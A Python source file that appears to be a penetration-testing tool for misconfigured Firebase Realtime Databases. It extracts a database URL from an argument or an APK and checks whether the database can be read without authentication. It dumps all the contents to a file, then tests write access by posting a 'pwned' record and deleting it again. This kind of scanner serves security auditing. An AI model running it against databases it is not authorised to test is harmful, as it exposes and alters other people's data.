from pyfiglet import Figlet
from termcolor import colored
from argparse import ArgumentParser, Namespace
import requests
from tabulate import tabulate
import pandas as pd
import subprocess
import json
from pathlib import Path
import sys

def print_hi(header):
f = Figlet(font="fuzzy", width=180)
welcome = colored(f.renderText(text=header), "yellow")
if readargs().verbose:
print(f"\n{welcome}")

def printincolor(word, color='white'):
print(colored(word, color))

def validate_file(arg):
file_path = Path(arg)
if file_path.is_file():
return file_path
else:
printincolor(f"[-] File {arg} not found", "red")
sys.exit(0)

def extractfirebaseurlfromapk():
if readargs().apk is not None:
try:
cmd = ['strings', str(readargs().apk)]
result = subprocess.run(cmd, capture_output=True, text=True)
output = result.stdout

for line in output.split('\n'):
if 'firebaseio.com' in line.lower():
start_idx = line.find('http')
if start_idx != -1:
return line[start_idx:].strip()
return None
except Exception as e:
printincolor(f"[-] Error extracting Firebase URL: {str(e)}", "red")
return None
def readargs() -> Namespace:
parser = ArgumentParser()
parser.add_argument("-u", "--url", dest="url", help="set the firebase url", metavar="URL", required=False)
parser.add_argument("-o", "--output", dest="output", help="dump into filename ", required=False)
parser.add_argument("-a", "--apk", dest="apk", help="enter the path of the APK file.", required=False, type=validate_file)
parser.add_argument("-q", "--quiet", action="store_false", dest="verbose", default=True,
help="don't print status messages to stdout", required=False)
return parser.parse_args()

def writetofile(filename, dictdata):
try:
with open(filename, 'w') as file:
json_object = json.dumps(dictdata, indent=2)
file.write(json_object)
printincolor(f"[+] JSON data written to {filename}.", "green")
except Exception as e:
printincolor(f"[-] Error writing to file: {str(e)}", "red")

def printtable(title, dictdata: dict):
printincolor(f"[+] Dumping data of {colored(title, 'blue')}", "green")
df = pd.DataFrame(dictdata)
print(tabulate(df, headers='keys', tablefmt='pretty', showindex='always'))

def isreadabledatabase(firebaseURL: str) -> bool:
try:
jsondomain = addjsontofirebaseurl(firebaseURL)
response = requests.get(jsondomain, timeout=10)
return 200 <= response.status_code < 300
except requests.RequestException as e:
printincolor(f"[-] Error checking database readability: {str(e)}", "red")
return False

def addjsontofirebaseurl(firebaseURL: str) -> str:
domain = cleardomain(firebaseURL=firebaseURL)
jsondomain = domain + '.json'
return jsondomain

def getjsonoffirebase(firebaseURL: str):
try:
jsondomain = addjsontofirebaseurl(firebaseURL)
jsondata = requests.get(jsondomain, timeout=10)
return jsondata.json()
except requests.RequestException as e:
printincolor(f"[-] Error fetching JSON from Firebase: {str(e)}", "red")
return None
except json.JSONDecodeError as e:
printincolor(f"[-] Error decoding JSON: {str(e)}", "red")
return None

def extractdatabases(firebaseURL: str):
status = isreadabledatabase(firebaseURL)
if status:
jsondata = getjsonoffirebase(firebaseURL)
if jsondata is None:
return None

if readargs().output is not None:
writetofile(readargs().output, jsondata)

if isinstance(jsondata, dict):
return list(jsondata.keys())
return None
def addrecordtofirebase(firebaseURL: str):
try:
data = {"pwned": {"name": ["cTFk1ller"], "github": ["https://github.com/cTFk1ller&quot;]}}
jsondomain = addjsontofirebaseurl(firebaseURL)
response = requests.post(jsondomain, json=data, timeout=10)

if 200 <= response.status_code < 300:
databasename = response.json()['name']
printtable(databasename, data['pwned'])
printincolor(f"[*] about to remove added record", "blue")
status = deleterecord(firebaseURL, databasename)
if status:
printincolor(f"[+] Record {colored(databasename, 'blue')} {colored('deleted successfully', 'green')}", 'green')
else:
printincolor(f"[-] Error Deleting Record {colored(databasename, 'blue')} {colored('From Database', 'red')}", 'red')
return True
return False
except requests.RequestException as e:
printincolor(f"[-] Error adding record to Firebase: {str(e)}", "red")
return False
except json.JSONDecodeError as e:
printincolor(f"[-] Error decoding JSON response: {str(e)}", "red")
return False
def deleterecord(firebaseURL, record) -> bool:
try:
record = record.replace('.', '/') + '/'
domain = cleardomain(firebaseURL=firebaseURL) + record
url = addjsontofirebaseurl(domain)
response = requests.delete(url, timeout=10)
return 200 <= response.status_code < 300
except requests.RequestException as e:
printincolor(f"[-] Error deleting record: {str(e)}", "red")
return False

def cleardomain(firebaseURL: str):
firebaseURL = firebaseURL.strip()
url = firebaseURL if firebaseURL.endswith('/') else (firebaseURL + "/")
return url

def start(firebaseURL: str):
printincolor(f"[*] Start manipulating the Firebase domain at : {colored(firebaseURL, 'yellow')}", "blue")
status = isreadabledatabase(firebaseURL)
if status:
printincolor("[+] Firebase URL read permission is not set.", "green")
databases = extractdatabases(firebaseURL)
if databases is None:
printincolor("[-] No Databases Found", "red")
else:
printincolor(f"[+] Databases in the Firebase URL are: {', '.join(databases)}", "green")
statusofwriting = addrecordtofirebase(firebaseURL)
if statusofwriting:
printincolor(f"[+] The Firebase URL has no permission to write. You can write to it.", "green")
else:
printincolor(f"[-] Firebase URL has permission to write to the database.", "red")
else:
printincolor("[-] Firebase URL read permission is set correctly.", "red")

if name == 'main':
# Firebase Hacking
args = readargs()
print_hi("Firebase's insecure rules scanner")

if args.url is not None:
firebaseurl = cleardomain(args.url)
start(firebaseurl)
elif args.apk is not None: # url extracted from the apk
apkfirebaseurl = extractfirebaseurlfromapk()
if apkfirebaseurl is None: # apk contain a firebase url
printincolor("[-] The Firebase URL does not exist in the apk.", "red")
else:
start(firebaseURL=apkfirebaseurl)
else:
printincolor("[*] Please select --url, --apk. At least one option is required.", 'blue')

printincolor("[*] Done", "blue")
printincolor("\nMr.CTFKi11er", "red")
